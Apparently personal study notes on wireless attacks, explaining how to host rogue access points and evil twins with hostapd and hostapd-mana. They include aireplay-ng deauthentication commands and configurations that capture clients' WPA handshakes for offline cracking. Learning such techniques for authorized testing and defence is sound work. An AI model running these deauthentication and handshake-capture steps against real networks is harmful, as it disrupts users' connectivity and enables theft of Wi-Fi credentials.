---
description: >-
  Rogue Access Points
title:  Rogue Access Points      # Add title here
date: 2023-09-27 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
tags: [wireless, rogue AP, evil-twin]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

A rogue AP is an AP in use that has not been authorized by a local network administrator. This could take the form of an AP plugged into a network without the administrator's knowledge.

## Creating a Rogue AP
Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.

If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.

> With hostapd, we need to be listening with airodump (on another wifi interface) at the same time that we host the fake ap, to capture handshakes of clients that try to connect to us, despite the PSK mismatch (since we don't know the real PSK but will crack it from their handshake to us)
{: .prompt-warning }

Deauth a client if he doesn't connect to our AP
``sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon``

### hostapd / hostapd-mana
hostapd-mana is an enhanced version of hostapd. Both are used for hosting fake APs, but mana includes more options to do things like dump passwords obtained from the handshake. Hostapd-mana can read hostapd config files, but also includes other options 

Install
```bash
sudo apt install hostapd-mana
sudo apt install hostapd-mana
```

Simple hostapd-mana configuration file called `a.conf`
```bash
interface=wlan0
ssid=Mostar
channel=1
```

Run hostapd
```bash
hostapd a.conf
hostapd-mana a.conf
```

WPA/WPA2 configuration file: 

```bash
# Interface
interface=wlan0
# SSID
ssid=Mostar
# Channel  
channel=1
# Value "g" for 2.4GHz and value "n" for 5GHz
hw_mode=g 
# This value is needed to comply with 802.11n (Wi-Fi New Generation [Better transmission]) 
ieee80211n=1 
# always the same for all linux devices
driver=nl80211  
# Value 3 enable both WPA and WPA2. Value 2 enable WPA2. Value 1 enable WPA.
wpa=3 
# To enable WPA-PSK
wpa_key_mgmt=WPA-PSK 
# Random value, irrelevant for this purpose, but needed.
wpa_passphrase=ANYPASSWORD 
# Enable TKIP/CCMP encryption with WPA. (Only use this or rsn_pairwise)
wpa_pairwise=TKIP CCMP 
# Enable TKIP/CCMP encryption with WPA2. (Only use this or wpa_pairwise)
rsn_pairwise=TKIP CCMP 
# File where WPA hashes will be saved
mana_wpaout=/home/kali/mostar.hccapx 

- auth_algs (this is for WEP, for WPA use the equivalent ``wpa`` parameter-> 
	- ``auth_algs=0`` ->OPEN
	- ``auth_algs=1`` ->WEP
	- ``auth_algs=2`` -> Both
- ``wep_key0`` <- we can use up to 4
```
To deauthenticate clients, we first connect a new wireless card and start monitor mode on channel 1 by using airmon-ng. The channel should be set to "1" to match that of our target AP. This is all accomplished by running sudo airmon-ng start wlan1 1. Next, we can use aireplay-ng to run a deauthentication attack (-0), continuously (0), against all clients connected to our target AP (-a FC:7A:2B:88:63:EF).

```bash
### This channel needa to be the exact same of the SSID where deauth will be executed
sudo airmon-ng start wlan1 1
### Use the BSSID to deauthenticate
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1
```

#### hostap with  no encryption
```
interface=wlan1
ssid=hostel-A
hw_mode=g
channel=6
driver=nl80211
```

#### hostap with wep
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=hostel-A
auth_algs=1
wep_default_key=0
wep_key0="54321"
```

#### hostap with WPA-PSK
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=HomeAlone
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
wpa_passphrase=welcome@123
```

#### hostap with WPA2-PSK
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211
ssid=Lost-in-space
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=beautifulsoup

# SSID 2
bss=wlan1_0
ssid=LOCOMO-Mobile-hotspot
auth_algs=1
wpa=1
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=beautifulsoup
```

alternative
```
interface=wlan1
hw_mode=g
channel=6
driver=nl80211

ssid=Lost-in-space
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=beautifulsoup
```

#### Hosting several APs
Two different ESSIDs with the same wifi antenna (interface wlan1). With hostap, if we want to simulate several ESSIDs, the first one must use the keyword "interface" and the real interface name, and the next ones use the keyword "bss" and we use fictitious names, like wlan1_0. This can be used if a client probes different clients.
```
# SSID 1
interface=wlan1
driver=nl80211
ssid=dex-net
wpa=2
wpa_passphrase=123456789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1

# SSID 2
bss=wlan1_0
ssid=dex-network
wpa=2
wpa_passphrase=123456789
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
channel=1
```


```
interface=wlan0
ssid=<ESSID>
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/output.hccapx
```
